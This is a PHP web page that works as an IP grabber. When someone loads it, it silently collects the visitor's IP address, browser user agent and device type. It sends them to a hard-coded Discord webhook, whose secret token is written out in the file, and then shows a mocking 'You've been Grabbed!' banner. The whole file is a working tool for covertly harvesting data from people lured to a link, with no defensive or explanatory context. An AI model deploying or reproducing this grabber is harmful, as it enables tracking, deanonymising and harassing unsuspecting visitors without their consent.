<?php

// Function to retrieve the user's IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ipList as $ip) {
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['REMOTE_ADDR']) && filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return 'UNKNOWN';
}

// Function to retrieve the user's browser info
function getUserBrowser() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
}

// Function to determine the user's device type
function getUserDevice() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

    if (preg_match('/mobile/i', $userAgent)) {
        return 'Mobile';
    } elseif (preg_match('/tablet/i', $userAgent)) {
        return 'Tablet';
    } else {
        return detectOS($userAgent);
    }
}

// Helper function to detect OS from user agent
function detectOS($userAgent) {
    $os = 'Unknown OS';

    if (preg_match('/windows nt/i', $userAgent)) {
        $os = 'Windows';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'Mac OS';
    } elseif (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/android/i', $userAgent)) {
        $os = 'Android';
    } elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) {
        $os = 'iOS';
    }

    return 'Desktop (' . $os . ')';
}

// Webhook function using cURL
function sendToWebhook($webhookURL, $data) {
    $ch = curl_init($webhookURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'cURL error: ' . curl_error($ch);
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200 && $httpCode !== 204) {
        echo "Discord returned HTTP code: $httpCode\nResponse: $result";
    }

    curl_close($ch);
    return $result;
}

// Gather user details
$userIP = getUserIP();
$userBrowser = getUserBrowser();
$userDevice = getUserDevice();

// Discord webhook URL
$webhookURL = "https://discord.com/api/webhooks/1325168587882889257/1zJNbweNL690W_KESw1xIWrHqaT8hy_Z0jmnRpPwZlQOvxG6b2L7yqJrC5Ug1HEgYmk4";

// Create the message data
$data = [
    "content" => "`📡` IP: " . $userIP . "\n`🌐` Browser: " . $userBrowser . "\n`🖥️` Device: " . $userDevice,
];

// Send the data to the Discord webhook
$response = sendToWebhook($webhookURL, $data);
if ($response) {
    echo "Message sent to Discord webhook successfully.";
} else {
    echo "An error occurred while sending the message.";
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You've been Grabbed!</title>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            font-size: 4em;
            text-shadow: 2px 2px 8px #ff0000, 0 0 10px #ff0000, 0 0 20px #8b0000;
            animation: flicker 1.5s infinite alternate;
        }
        @keyframes flicker {
            0% {
                opacity: 1;
                text-shadow: 2px 2px 8px #ff0000, 0 0 10px #ff0000, 0 0 20px #8b0000;
            }
            50% {
                opacity: 0.7;
                text-shadow: 2px 2px 12px #ff3333, 0 0 12px #ff3333, 0 0 30px #b30000;
            }
            100% {
                opacity: 0.9;
                text-shadow: 2px 2px 15px #ff6666, 0 0 15px #ff6666, 0 0 40px #e60000;
            }
        }
    </style>
</head>
<body>
    <h1>You've been Grabbed!</h1>
</body>
</html>
